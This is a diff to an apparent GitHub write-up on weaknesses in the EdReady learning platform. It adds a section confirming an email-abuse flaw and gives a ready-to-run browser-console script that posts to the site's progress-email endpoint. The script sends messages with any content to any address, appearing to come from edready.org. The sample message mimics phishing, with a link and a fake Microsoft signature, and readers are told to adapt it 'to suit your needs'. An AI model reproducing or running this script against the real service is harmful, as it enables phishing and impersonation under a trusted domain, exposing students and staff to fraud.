@@ -52,6 +52,30 @@ This has to do again with the client-sided code, but this time, it has to do wit
 
 Essentially, EdReady will occasionally send both the instructor & student "progress" emails intended to inform both parties about the student's progress within the course. However, on first glance, there does not seem to be any e-mail validation, meaning, someone with an authenticated account (this would essentially just equate to someone who is logged into any account on the same domain, so for example, another student) could send any email to *anybody*, with it appearing to come from *edready.org! However, I have not tested this, so please take this with a heavy grain of salt.
 
+## EDIT: This vulnerability has been confirmed by me. By sending a POST request using it's built-in "doJSONPost" function, you are able to send an email to anyone you would like with whatever content you'd like.
+This is an example script (you'd run it in the browser console):
+```javascript
+var progressMessageEmail = {
+    goalName: "Test Name",
+    assessmentName: "Amazing Test Name LOLL",
+    // will appear right below "Your Message:"
+    message: "hi sir plz click lnik: https://microsoft.com for fre row buck >w<",
+    // appears right under the message above
+    secondMessage: "sincierly microsoft",
+    // can only send to 1 email at a time
+    emails: "youremail@example.com",
+    // set to false if you don't want to be CC'd
+    email_student: false
+};
+
+doJSONPost("/ajax/assessment/sendProgressEmail", $.toJSON(progressMessageEmail), null, null);
+```
+Running the above code (but modifying it to suit your needs) results in something like this being sent:
+![image](https://github.com/million1156/EdReady/assets/91338231/223f1c2c-fc07-4af4-9639-6c0ddcb0ed41)
+
+Note; Your real name (or whatever name you set in your settings) is included in the email, so be aware!
+
+
 ### Part 3: Requests, requests, requests!
 When submitting an answer to the server, the client formats it like this:
 ```json
